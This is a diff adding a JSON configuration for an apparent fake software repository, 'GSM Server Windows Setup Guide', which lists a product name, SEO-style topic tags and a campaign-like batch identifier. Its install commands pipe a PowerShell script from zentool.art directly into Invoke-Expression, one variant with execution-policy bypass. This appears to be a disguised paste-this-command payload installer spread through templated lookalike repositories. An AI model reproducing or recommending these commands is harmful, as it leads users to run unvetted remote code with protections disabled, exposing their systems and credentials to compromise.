@@ -1,0 +1,31 @@
+{
+  "repo": "GSM-Server-Windows-Setup-Guide",
+  "product": "GSM Server Windows Setup Guide",
+  "product_title": "GSM Server Windows Setup Guide",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "gsm-server-windows-guide",
+    "gsm-server-windows-guide-windows",
+    "gsm-server-windows-guide-desktop",
+    "gsm",
+    "server",
+    "disk-utility",
+    "file-management",
+    "windows-utility",
+    "desktop-tools",
+    "pc-maintenance",
+    "windows-11",
+    "windows-10",
+    "desktop-software",
+    "install-guide",
+    "windows-desktop"
+  ],
+  "site": "zentool.art"
+}
